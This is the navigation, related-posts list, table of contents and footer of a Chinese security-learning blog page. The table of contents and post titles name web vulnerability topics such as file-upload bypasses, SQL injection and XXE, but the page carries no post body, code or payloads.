onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">linux系统用户apt下载安装输出dpkg 无法恢复的致命错误</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/23/kalilinux%E4%BD%BF%E7%94%A8Typora%E5%8A%A0PicGo/"><img class="next-cover" src="https://gitee.com/wZass/zp/raw/master/img/image-20201225170803296.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">kali linux 使用Typora加PicGo</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/07/11/1. 文件上发漏洞/" title="1. 文件上发漏洞之php编写上传文件"><img class="cover" src="https://pic.3gbizhi.com/2020/0914/20200914111243880.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-11</div><div class="title">1. 文件上发漏洞之php编写上传文件</div></div></a></div><div><a href="/2020/08/10/1. 网易手动sql注入/" title="1. 网易web安全渗透  手动sql注入"><img class="cover" src="https://pic.3gbizhi.com/2020/0827/20200827070138265.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-10</div><div class="title">1. 网易web安全渗透  手动sql注入</div></div></a></div><div><a href="/2020/10/14/1.XXE漏洞原理和实战/" title="1.XXE漏洞原理和实战之xml的学习1"><img class="cover" src="https://pic.3gbizhi.com/2020/1012/20201012103032240.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-14</div><div class="title">1.XXE漏洞原理和实战之xml的学习1</div></div></a></div><div><a href="/2020/10/27/1.web信息收集之搜索引擎/" title="1.web信息收集之google搜索引擎"><img class="cover" src="https://gitee.com/wZass/zp/raw/master/img/20201027095251.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-27</div><div class="title">1.web信息收集之google搜索引擎</div></div></a></div><div><a href="/2019/09/14/1.手动挖掘漏洞明实验和使用/" title="1.手动挖掘漏洞身份认证"><img class="cover" src="https://img-blog.csdnimg.cn/20190913191358248.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-09-14</div><div class="title">1.手动挖掘漏洞身份认证</div></div></a></div><div><a href="/2020/08/10/2. 网易union联合查询注入/" title="2. 网易web安全渗透  union联合查询注入"><img class="cover" src="https://pic.3gbizhi.com/2020/0629/20200629095051433.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-10</div><div class="title">2. 网易web安全渗透  union联合查询注入</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PUT-%E6%96%B9%E6%B3%95%E6%96%87%E4%BB%B6%E4%B8%8A%E5%8F%91"><span class="toc-number">1.</span> <span class="toc-text">PUT 方法文件上发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%90%AFPUT"><span class="toc-number">1.1.</span> <span class="toc-text">开启PUT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E5%BC%80%E5%90%AFPUT%E8%AF%B7%E6%B1%82"><span class="toc-number">1.1.1.</span> <span class="toc-text">查看有没有开启PUT请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8PUT%E8%AF%B7%E6%B1%82%E4%B8%8A%E5%8F%91%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.2.</span> <span class="toc-text">用PUT请求上发文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E6%A3%80%E6%9F%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">前端检查绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">修改文件名绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">文件类型绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E5%86%85%E5%AE%B9%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">修改数据包的内容绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%86%E7%85%A7%E7%89%87%E5%92%8Cwebshell%E5%90%88%E6%88%90%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">将照片和webshell合成绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%9C%AF%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">文件幻术头绕过</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
